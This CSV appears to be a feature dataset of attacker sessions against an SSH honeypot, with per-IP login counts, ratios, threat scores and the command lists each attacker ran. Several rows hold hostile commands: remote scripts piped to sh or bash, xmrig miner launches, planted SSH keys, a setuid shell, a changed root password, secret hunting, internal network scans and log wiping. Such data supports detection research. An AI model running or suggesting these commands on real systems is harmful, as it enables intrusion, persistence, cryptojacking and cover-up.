src_ip,total_events,unique_sessions,failed_logins,success_logins,unique_usernames,unique_passwords,unique_dst_ports,unique_protocols,commands_executed,files_downloaded,c2_connections,has_payload,avg_session_duration,total_bytes_sent,total_bytes_received,high_severity_events,medium_severity_events,unique_mitre_techniques,unique_attack_types,compromised_count,commands_list,top_commands,all_commands_unique,unique_commands,suspicious_command_count,uses_downloader,exec_chain_detected,fail_rate,success_rate,user_reuse_ratio,cmd_per_session,bytes_ratio,threat_score,connection_rate,burst_score
1.117.185.183,32,1,5,27,3,3,1,1,24,32,32,1,385.0,74472.0,19873.0,0,32,1,1,0,"['hostname', 'last | head -20', 'cat /etc/hostname', 'id', 'w', ""cat /proc/cpuinfo | grep 'model name' | head -1"", ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", ""mount | grep -v 'tmpfs\\|cgroup'"", 'ip route show', 'netstat -antp', 'cat /etc/resolv.conf', 'ip r', 'ss -antp', 'top -bn1 | head -20', 'pstree -a', 'ps aux | grep -v grep', 'ps aux', 'cat /proc/1/cmdline', 'ls -la /home/ubuntu', 'ls -la /home/ubuntu/TaskBoard', 'ls -la /', 'ls /home', 'shred -u /var/log/auth.log', 'disconnect']","hostname(1), last | head -20(1), cat /etc/hostname(1), id(1), w(1)","hostname, last | head -20, cat /etc/hostname, id, w, cat /proc/cpuinfo | grep 'model name' | head -1, sysctl -a 2>/dev/null | grep -i 'net\|kernel', mount | grep -v 'tmpfs\|cgroup', ip route show, netstat -antp",24,0,0,0,0.15151515151515152,0.8181818181818182,0.5,12.0,3.7472074066619703,5.878787878787879,6.65624317475065,0.13006271160111907
1.7.236.106,19,1,3,16,1,1,1,1,14,19,19,0,841.0,35058.0,50747.0,19,0,1,1,0,"['uname -a', 'uptime', 'ls -la /', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls /', 'ls -la /var/tmp', ""find / -name '*.key' 2>/dev/null | head -10"", 'cat /home/ubuntu/TaskBoard/Backend/config/db.js', 'cat ~/.bashrc', 'cat ~/.profile', 'env | grep -i token', 'cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash', 'chmod 600 ~/.ssh/authorized_keys', 'exit']","uname -a(1), uptime(1), ls -la /(1), ls -la /home/ubuntu/TaskBoard/Backend/(1), ls /(1)","uname -a, uptime, ls -la /, ls -la /home/ubuntu/TaskBoard/Backend/, ls /, ls -la /var/tmp, find / -name '*.key' 2>/dev/null | head -10, cat /home/ubuntu/TaskBoard/Backend/config/db.js, cat ~/.bashrc, cat ~/.profile",14,2,0,0,0.15,0.8,0.75,7.0,0.6908252541972097,6.85,6.586892084751344,0.1363236747122372
100.30.37.97,5,1,5,0,1,1,1,1,0,5,5,0,20.0,1647.0,435.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,3.7775229357798166,5.0,5.0,0.40304749039601806
102.29.12.14,7,1,7,0,3,3,1,1,0,7,7,0,16.0,1368.0,132.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,10.285714285714286,4.375,7.0,0.44197563213377633
103.43.124.152,5,1,5,0,1,1,1,1,0,5,5,0,3.0,615.0,1016.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,0.6047197640117994,4.166666666666667,5.0,0.30738937258132404
104.254.253.95,11,1,11,0,6,7,1,1,0,11,11,0,5.0,2934.0,1254.0,0,11,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.5,0.0,2.337848605577689,5.5,11.0,0.4421457805448864
104.92.205.221,9,1,9,0,5,5,1,1,0,9,9,0,20.0,2978.0,289.0,0,9,1,1,0,[],none,none,0,0,0,0,0.9,0.0,0.5,0.0,10.26896551724138,5.4,9.0,0.5668419696757532
107.16.32.246,8,1,8,0,2,4,1,1,0,8,8,0,3.0,894.0,1265.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.7777777777777778,0.0,0.7061611374407583,4.444444444444445,8.0,0.5263608149048974
107.162.248.75,25,1,4,21,2,2,1,1,18,25,25,3,232.0,34680.0,47834.0,25,0,1,1,0,"['cat /etc/os-release', 'id', 'hostname', 'w', ""find / -name 'id_rsa' 2>/dev/null"", ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls /home/ubuntu/TaskBoard', 'ls -la /home/ubuntu/TaskBoard', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', 'curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64', '/tmp/payload.sh &', 'chmod +x /tmp/.xmrig', 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', 'cat /proc/cpuinfo | grep processor | wc -l', 'cat /dev/null > ~/.bash_history', 'rm -f ~/.bash_history', 'quit']","cat /etc/os-release(1), id(1), hostname(1), w(1), find / -name 'id_rsa' 2>/dev/null(1)","cat /etc/os-release, id, hostname, w, find / -name 'id_rsa' 2>/dev/null, find / -name '*.conf' -readable 2>/dev/null | head -20, ls /home/ubuntu/TaskBoard, ls -la /home/ubuntu/TaskBoard, curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh, curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64",18,3,1,0,0.15384615384615385,0.8076923076923077,0.6,9.0,0.7249921605518972,7.1923076923076925,7.603020933650971,0.1392756474364681
107.52.72.242,8,1,8,0,4,4,1,1,0,8,8,0,4.0,2968.0,1153.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,2.5719237435008666,5.333333333333333,8.0,0.4252061423502597
107.95.124.5,10,1,10,0,4,6,1,1,0,10,10,0,30.0,1565.0,243.0,0,10,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.6363636363636364,0.0,6.413934426229508,5.454545454545454,10.0,0.5511307041314621
108.112.10.131,14,1,3,11,1,1,1,1,9,14,14,0,103.0,18605.0,17747.0,14,0,1,1,0,"['uname -a', 'cat /etc/hostname', 'find / -perm -4000 -type f 2>/dev/null', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'cat /home/ubuntu/TaskBoard/Backend/.env', 'node -e ""require(\'/home/ubuntu/TaskBoard/Backend/config/db.js\')""', ""echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys"", ""(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -"", 'disconnect']","uname -a(1), cat /etc/hostname(1), find / -perm -4000 -type f 2>/dev/null(1), find / -name '*.conf' -readable 2>/dev/null | head -20(1), cat /home/ubuntu/TaskBoard/Backend/.env(1)","uname -a, cat /etc/hostname, find / -perm -4000 -type f 2>/dev/null, find / -name '*.conf' -readable 2>/dev/null | head -20, cat /home/ubuntu/TaskBoard/Backend/.env, node -e ""require('/home/ubuntu/TaskBoard/Backend/config/db.js')"", echo 'ssh-rsa AAAA...attacker_key...== root@attacker' >> ~/.ssh/authorized_keys, (crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://45.142.212.100/ping | bash') | crontab -, disconnect",9,1,1,0,0.2,0.7333333333333333,0.75,4.5,1.0482871309443318,6.666666666666667,8.184422316191515,0.11383615553928754
108.171.137.189,24,1,3,21,1,1,1,1,18,24,24,3,155.0,106542.0,39017.0,0,0,1,1,0,"['last | head -20', 'hostname', 'cat /etc/os-release', 'uname -s -r', 'find /tmp -type f 2>/dev/null', 'ls -la /root', ""find /home -name '*.env' 2>/dev/null"", ""find / -name 'id_rsa' 2>/dev/null"", 'ls -la /tmp', 'bash /tmp/install.sh > /dev/null 2>&1 &', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'chmod +x /tmp/.xmrig', 'wget -q http://91.92.251.103/xmrig -O /tmp/.xmrig', '/tmp/xmrig -o xmr.f2pool.com:13531 -u WALLET_ADDR -p x --cpu-max-threads-hint=90 &', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", ""pkill -f 'sshd: root'"", ""echo '' > ~/.bash_history"", 'exit']","last | head -20(1), hostname(1), cat /etc/os-release(1), uname -s -r(1), find /tmp -type f 2>/dev/null(1)","last | head -20, hostname, cat /etc/os-release, uname -s -r, find /tmp -type f 2>/dev/null, ls -la /root, find /home -name '*.env' 2>/dev/null, find / -name 'id_rsa' 2>/dev/null, ls -la /tmp, bash /tmp/install.sh > /dev/null 2>&1 &",18,3,1,1,0.12,0.84,0.75,9.0,2.730585883438413,5.48,7.9488184412587835,0.15325230565053202
108.23.30.179,5,1,5,0,1,1,1,1,0,5,5,0,7.0,2517.0,660.0,5,0,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,3.8078668683812404,5.833333333333333,5.0,0.3634232158146286
109.158.70.50,26,1,5,21,3,3,1,1,18,26,26,1,479.0,97612.0,57871.0,0,0,1,1,0,"['last | head -20', 'cat /etc/os-release', 'uptime', 'hostname', 'w', 'cat ~/.ssh/known_hosts', 'cat /home/ubuntu/notes.txt', 'cat /etc/group', ""grep -rn 'JWT_SECRET\\|DB_PASS\\|MONGO_URI' /home/ubuntu/TaskBoard/ 2>/dev/null"", 'ls -la /home', 'find /var/tmp -type f 2>/dev/null', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls /home', 'ls -la /dev/shm', 'cp /bin/bash /tmp/.bash && chmod +s /tmp/.bash', ""mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...== pwned' >> ~/.ssh/authorized_keys"", ""echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"", 'exit']","last | head -20(1), cat /etc/os-release(1), uptime(1), hostname(1), w(1)","last | head -20, cat /etc/os-release, uptime, hostname, w, cat ~/.ssh/known_hosts, cat /home/ubuntu/notes.txt, cat /etc/group, grep -rn 'JWT_SECRET\|DB_PASS\|MONGO_URI' /home/ubuntu/TaskBoard/ 2>/dev/null, ls -la /home",18,1,0,0,0.18518518518518517,0.7777777777777778,0.5,9.0,1.6866878628697817,4.962962962962963,6.97350069735007,0.13274947837400022
109.208.11.70,6,1,6,0,2,2,1,1,0,6,6,0,18.0,661.0,214.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,3.074418604651163,5.142857142857143,6.0,0.6081905175037463
109.61.106.105,8,1,8,0,4,4,1,1,0,8,8,0,30.0,2399.0,885.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,2.7076749435665914,5.333333333333333,8.0,0.5068295929588814
110.26.158.109,7,1,7,0,2,3,1,1,0,7,7,0,2.0,1040.0,312.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.75,0.0,3.3226837060702876,4.375,7.0,0.4937533091215312
110.9.54.235,25,1,5,20,3,3,1,1,17,25,25,3,468.0,45698.0,25609.0,25,0,1,1,0,"['hostname -f', 'cat /etc/hostname', 'hostname', 'uname -a', 'ls /home', 'find /tmp -type f 2>/dev/null', 'ls -la /', 'curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh', 'wget -q http://45.142.212.100/setup.sh -P /tmp/', 'curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64', 'curl -fsSL http://176.97.66.164/b.sh | sh', '/tmp/xmrig -o xmr.f2pool.com:13531 -u WALLET_ADDR -p x --cpu-max-threads-hint=90 &', 'nohup /tmp/xmrig --donate-level 1 -o pool.hashvault.pro:80 -u WALLET -p worker1 &', '/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background', 'cat /proc/cpuinfo | grep processor | wc -l', 'nproc --all', 'quit']","hostname -f(1), cat /etc/hostname(1), hostname(1), uname -a(1), ls /home(1)","hostname -f, cat /etc/hostname, hostname, uname -a, ls /home, find /tmp -type f 2>/dev/null, ls -la /, curl -fsSL http://185.234.219.39/install.sh -o /tmp/install.sh, wget -q http://45.142.212.100/setup.sh -P /tmp/, curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64",17,4,1,0,0.19230769230769232,0.7692307692307693,0.5,8.5,1.7843811011323703,7.269230769230769,8.151642284198855,0.129780108081648
111.225.134.189,5,1,5,0,1,1,1,1,0,5,5,0,28.0,1255.0,1116.0,0,5,1,1,0,[],none,none,0,0,0,0,0.8333333333333334,0.0,0.8333333333333334,0.0,1.1235452103849597,5.0,5.0,0.40382518215388225
111.49.69.247,17,1,3,14,1,1,1,1,11,17,17,3,740.0,14046.0,13920.0,0,0,1,1,0,"['cat /etc/os-release', 'uptime', 'ls /home/ubuntu/TaskBoard', 'ls -la /home/ubuntu/TaskBoard/Backend/', 'ls /home/ubuntu/TaskBoard/Backend', 'wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh', 'curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64', 'nproc --all', ""echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh"", 'rm -f ~/.bash_history', 'quit']","cat /etc/os-release(1), uptime(1), ls /home/ubuntu/TaskBoard(1), ls -la /home/ubuntu/TaskBoard/Backend/(1), ls /home/ubuntu/TaskBoard/Backend(1)","cat /etc/os-release, uptime, ls /home/ubuntu/TaskBoard, ls -la /home/ubuntu/TaskBoard/Backend/, ls /home/ubuntu/TaskBoard/Backend, wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh, curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64, nproc --all, echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh, rm -f ~/.bash_history",11,2,1,0,0.16666666666666666,0.7777777777777778,0.75,5.5,1.0089792399971267,5.277777777777778,8.55640094288183,0.13613072387132377
112.117.110.59,10,1,10,0,5,6,1,1,0,10,10,0,23.0,1196.0,1070.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.5454545454545454,0.0,1.1167133520074697,4.545454545454546,10.0,0.5346633821589024
113.172.159.46,7,1,7,0,3,3,1,1,0,7,7,0,6.0,206.0,877.0,0,0,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,0.23462414578587698,4.375,7.0,0.5354077551966371
113.85.68.191,11,1,11,0,7,7,1,1,0,11,11,0,8.0,939.0,311.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9166666666666666,0.0,0.41666666666666663,0.0,3.0096153846153846,4.583333333333333,11.0,0.5098686518021222
114.102.249.63,10,1,10,0,5,6,1,1,0,10,10,0,11.0,2877.0,528.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.5454545454545454,0.0,5.438563327032136,6.363636363636363,10.0,0.5433177974473664
114.73.200.35,6,1,6,0,2,2,1,1,0,6,6,0,22.0,233.0,1365.0,0,6,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,0.1705710102489019,5.142857142857143,6.0,0.4106074745791079
114.95.188.199,26,1,5,21,3,3,1,1,19,26,26,1,251.0,79514.0,2170.0,26,0,1,1,0,"['who', 'cat /etc/os-release', 'dmesg | tail -20', ""sysctl -a 2>/dev/null | grep -i 'net\\|kernel'"", ""lscpu | grep -E 'CPU|Thread|Core'"", 'lsblk', 'curl -s ifconfig.me', 'netstat -antp', 'curl -s icanhazip.com', 'route -n', 'ps -ef', 'pstree -a', 'cat /proc/1/cmdline', 'ps aux', 'ls -la /home', 'ls -la /home/ubuntu', 'ls -la /tmp', 'ls /home', 'disconnect']","who(1), cat /etc/os-release(1), dmesg | tail -20(1), sysctl -a 2>/dev/null | grep -i 'net\|kernel'(1), lscpu | grep -E 'CPU|Thread|Core'(1)","who, cat /etc/os-release, dmesg | tail -20, sysctl -a 2>/dev/null | grep -i 'net\|kernel', lscpu | grep -E 'CPU|Thread|Core', lsblk, curl -s ifconfig.me, netstat -antp, curl -s icanhazip.com, route -n",19,2,1,0,0.18518518518518517,0.7777777777777778,0.5,9.5,36.62551819438047,6.962962962962963,6.317298464005573,0.12743876222006204
116.147.139.3,8,1,8,0,3,4,1,1,0,8,8,0,22.0,522.0,335.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.6666666666666667,0.0,1.5535714285714286,5.333333333333333,8.0,0.46084221657882535
116.48.103.104,12,1,12,0,6,7,1,1,0,12,12,0,30.0,2296.0,523.0,0,0,1,1,0,[],none,none,0,0,0,0,0.9230769230769231,0.0,0.5384615384615384,0.0,4.3816793893129775,4.615384615384615,12.0,0.4480580848883278
117.181.230.140,6,1,6,0,2,2,1,1,0,6,6,0,10.0,507.0,1362.0,6,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,0.371973587674248,6.0,6.0,0.47410148639270583
117.92.30.253,10,1,10,0,5,5,1,1,0,10,10,0,15.0,2226.0,765.0,10,0,1,1,0,[],none,none,0,0,0,0,0.9090909090909091,0.0,0.5454545454545454,0.0,2.906005221932115,6.363636363636363,10.0,0.4631407574731176
118.153.88.163,6,1,6,0,2,2,1,1,0,6,6,0,7.0,710.0,277.0,0,0,1,1,0,[],none,none,0,0,0,0,0.8571428571428571,0.0,0.7142857142857143,0.0,2.553956834532374,4.285714285714286,6.0,0.48158690074676486
120.130.196.212,20,1,3,17,1,1,1,1,14,20,20,1,371.0,101364.0,1990.0,20,0,1,1,0,"['hostname', 'whoami', 'uname -s -r', 'hostname -f', 'uname -a', ""pkill -f 'sshd: root'"", 'history -c', 'history -w', 'shred -u /var/log/auth.log', 'rm -f ~/.bash_history', 'chmod 600 ~/.ssh/authorized_keys', ""echo 'root:H4ck3d!' | chpasswd"", 'truncate -s 0 /var/log/auth.log', 'quit']","hostname(1), whoami(1), uname -s -r(1), hostname -f(1), uname -a(1)","hostname, whoami, uname -s -r, hostname -f, uname -a, pkill -f 'sshd: root', history -c, history -w, shred -u /var/log/auth.log, rm -f ~/.bash_history",14,2,0,0,0.14285714285714285,0.8095238095238095,0.75,7.0,50.911099949773984,6.9523809523809526,7.286062975870987,0.13033563092414668
121.162.193.73,24,1,3,21,1,1,1,1,17,24,24,2,425.0,85775.0,41092.0,24,0,1,1,0,"['uname -a', 'hostname', 'cat /etc/hosts', 'ss -tulnp', ""grep -r 'Host ' ~/.ssh/config 2>/dev/null"", 'cat /etc/ssh/ssh_known_hosts 2>/dev/null', ""ssh -o StrictHostKeyChecking=no ubuntu@172.31.0.10 'cat /etc/passwd'"", 'for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done', 'ssh -o StrictHostKeyChecking=no root@10.0.1.50 id', 'nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null', ""nmap -p 22 --open 10.0.0.0/8 -T4 --max-retries 1 2>/dev/null | grep 'Nmap scan'"", ""for i in $(seq 1 254); do ping -c1 -W1 192.168.1.$i &>/dev/null && echo '192.168.1.'$i' alive'; done"", 'masscan 10.0.0.0/8 -p22 --rate=5000 2>/dev/null', ""pkill -f 'sshd: root'"", ""echo '' > ~/.bash_history"", 'rm -rf /var/log/auth.log', 'quit']","uname -a(1), hostname(1), cat /etc/hosts(1), ss -tulnp(1), grep -r 'Host ' ~/.ssh/config 2>/dev/null(1)","uname -a, hostname, cat /etc/hosts, ss -tulnp, grep -r 'Host ' ~/.ssh/config 2>/dev/null, cat /etc/ssh/ssh_known_hosts 2>/dev/null, ssh -o StrictHostKeyChecking=no ubuntu@172.31.0.10 'cat /etc/passwd', for h in $(cat /tmp/hosts.txt); do ssh -o StrictHostKeyChecking=no -i /tmp/id_rsa root@$h id 2>/dev/null; done, ssh -o StrictHostKeyChecking=no root@10.0.1.50 id, nmap -sV -p 22,80,443,3306,5432,6379,27017 192.168.0.0/24 2>/dev/null",17,0,0,0,0.12,0.84,0.75,8.5,2.0873384761394886,6.88,7.055537862270021,0.14010620757080325
122.103.30.183,12,1,12,0,7,7,1,1,0,12,12,0,20.0,2205.0,636.0,0,12,1,1,0,[],none,none,0,0,0,0,0.9230769230769231,0.0,0.46153846153846156,0.0,3.4615384615384617,5.538461538461538,12.0,0.4898048281977749
122.208.125.120,8,1,8,0,4,3,1,1,0,8,8,0,5.0,1528.0,1277.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.1956181533646322,5.333333333333333,8.0,0.5509330278846771
126.0.220.52,8,1,8,0,4,4,1,1,0,8,8,0,12.0,1430.0,1064.0,0,8,1,1,0,[],none,none,0,0,0,0,0.8888888888888888,0.0,0.5555555555555556,0.0,1.3427230046948357,5.333333333333333,8.0,0.3993365846331029
126.11.147.170,7,1,7,0,3,3,1,1,0,7,7,0,19.0,535.0,450.0,0,7,1,1,0,[],none,none,0,0,0,0,0.875,0.0,0.625,0.0,1.1862527716186253,5.25,7.0,0.45668692313420944
126.11.218.43,27,1,3,24,1,1,1,1,20,27,27,2,536.0,57921.0,7870.0,27,0,1,1,0,"['w', 'uname -s -r', ""lscpu | grep -E 'CPU|Thread|Core'"", ""mount | grep -v 'tmpfs\\|cgroup'"", 'journalctl -n 50 --no-pager', 'ip route show', 'ss -antp', 'curl -s ifconfig.me', 'pstree -a', 'cat /proc/1/cmdline', 'ps aux', 'top -bn1 | head -20', 'ls -la /var/tmp', 'find / -perm -4000 -type f 2>/dev/null', ""find / -name '*.conf' -readable 2>/dev/null | head -20"", 'ls -la /home', 'shred -u /var/log/auth.log', 'history -w', 'cat /dev/null > ~/.bash_history', 'exit']","w(1), uname -s -r(1), lscpu | grep -E 'CPU|Thread|Core'(1), mount | grep -v 'tmpfs\|cgroup'(1), journalctl -n 50 --no-pager(1)","w, uname -s -r, lscpu | grep -E 'CPU|Thread|Core', mount | grep -v 'tmpfs\|cgroup', journalctl -n 50 --no-pager, ip route show, ss -antp, curl -s ifconfig.me, pstree -a, cat /proc/1/cmdline",20,1,1,0,0.10714285714285714,0.8571428571428571,0.75,10.0,7.358785414813874,6.964285714285714,8.363664524122976,0.1466798272265553
